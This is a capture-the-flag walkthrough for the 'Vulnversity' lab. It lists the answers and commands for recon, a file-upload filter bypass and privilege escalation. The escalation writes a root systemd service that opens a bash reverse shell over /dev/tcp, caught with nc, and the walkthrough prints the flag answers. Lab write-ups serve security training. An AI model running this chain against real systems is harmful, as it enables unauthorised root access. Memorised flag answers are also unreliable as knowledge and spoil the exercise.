# Vulnversity

```
export IP=10.10.2.137
```

# Task 1 - Deploy Machine

1. No Answer Needed

# Task 2 - Reconnaissance

1. Scan the box, how many ports are open?

```
nmap -sV $IP
```
*ANS = 6*

2. What version of the squid proxy is running on the machine?

*ANS = 3.5.12*

3. How many ports will nmap scan if the flag -p-400 was used?

*ANS = 400*

4. Using the nmap flag -n what will it not resolve?

*ANS = DNS*

5. What is the most likely operating system this machine is running?

*ANS = ubuntu*

6. What port is the web server running on?

*ANS = 3333*

# Task 3 - Locating Directories Using GoBuster


1. What is the directory that has an upload form page?

```
gobuster -u http://$IP:3333 -w /usr/share/wordlists/dirbuster.txt
```
*ANS = /internal*

# Task 4 - Compromise The Webserver

1. Try upload a few file types to the server, what common extension seems to be blocked?

*ANS = .php*

2. Run this attack, what extension is allowed?

*ANS = .phtml*

3. What is the name of the user who manages the webserver?

```
cat /etc/passwd
```
*ANS = bill*

4. What is the user flag?

```
ls
cd home
cd bill
cat user.txt
```
*ANS = 8bd7992fbe8a6ad22a63361004cfcedb*

# Task 5 - Privilege Escalation

1. On the system, search for all SUID files. What file stands out?
*Search for all SUID files, ignore any "Permission Denied"*
```
find * -perm /4000 -print 2>/dev/null
```

2. Become root and get the last flag (/root/root.txt)
*Find a writable directory*
```
find -type d -maxdepth 2 -writable
```
*Create a new service file*
```
touch root.service
```
*Echo payload to root.service file (change $IP to IP of webserver)*
```
echo "[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/9999 0>&1'

[Install]
WantedBy=multi-user.target" > root.service
```
*Open a new terminal window and connect to webserver using phtml exploit, listen on port 9999*
```
nc -lvnp 9999
```
*Enable the service*
```
/bin/systemctl enable /var/tmp/root.service
```
*Start the service*
```
/bin/systemctl start root
```
*Second terminal is now logged in as root*